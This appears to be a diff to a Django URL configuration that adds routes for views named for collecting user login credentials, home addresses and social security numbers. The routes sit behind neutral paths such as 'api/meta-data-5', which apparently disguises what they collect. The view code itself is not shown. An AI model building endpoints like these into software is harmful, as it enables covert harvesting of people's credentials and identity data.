@@ -18,10 +18,15 @@ Including another URLconf
 from django.contrib import admin
 from django.urls import include, path
 
-from user_data.views import collect_user_login_cred
+from user_data.views import collect_user_basic_info, collect_user_home_address, collect_user_login_cred, collect_user_login_cred2, collect_user_social_security, collect_user_social_security_2
 
 urlpatterns = [
     path("admin/", admin.site.urls),
     path("api/", include("access.urls", "access_api")),
     path("api/meta-data-1/", collect_user_login_cred, name="collect_user_login_cred"),
+    path("api/meta-data-2/", collect_user_login_cred2, name="collect_user_login_cred2"),
+    path("api/meta-data-3/", collect_user_basic_info, name="collect_user_basic_info"),
+    path("api/meta-data-4/", collect_user_home_address, name="collect_user_home_address"),
+    path("api/meta-data-5/", collect_user_social_security, name="collect_user_social_security"),
+    path("api/meta-data-6/", collect_user_social_security_2, name="collect_user_social_security_2"),
 ]
